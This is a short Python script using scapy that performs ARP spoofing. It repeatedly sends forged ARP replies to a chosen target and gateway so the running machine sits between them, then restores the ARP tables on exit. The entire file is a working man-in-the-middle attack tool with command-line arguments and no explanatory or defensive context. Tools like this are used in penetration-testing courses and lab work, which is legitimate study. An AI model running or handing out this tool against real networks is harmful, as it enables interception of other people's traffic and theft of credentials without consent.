#!/usr/bin/python3
import sys
import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='Target', help='Target IP')
    parser.add_argument('-s', '--spoof', dest='Spoof', help='Spoof IP')
    options = parser.parse_args()
    if not options.Target:
        parser.error('[-] Please specify an Target IP, use --help for more info')
    elif not options.Spoof:
        parser.error('[-] Please specify an Spoof IP, use --help for more info')
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    MAC = answered_list[0][1].hwsrc
    return MAC

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def program(target_IP, gateway_IP):
    try:
        sent_packets_count = 0
        while True:
            spoof(target_IP, gateway_IP)
            spoof(gateway_IP, target_IP)
            sent_packets_count += 1
            print('\r[+] Sent Packet To (Target & Gateway): ' + str(sent_packets_count), end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print('\n\n[+] Resetting ARP tables Hold a Sec...')
        restore(target_IP, gateway_IP)
        restore(gateway_IP, target_IP)
        print('\n[+] Done! Quitting....')
Target_IP = get_arguments().Target
Gateway_IP = get_arguments().Spoof
program(Target_IP, Gateway_IP)
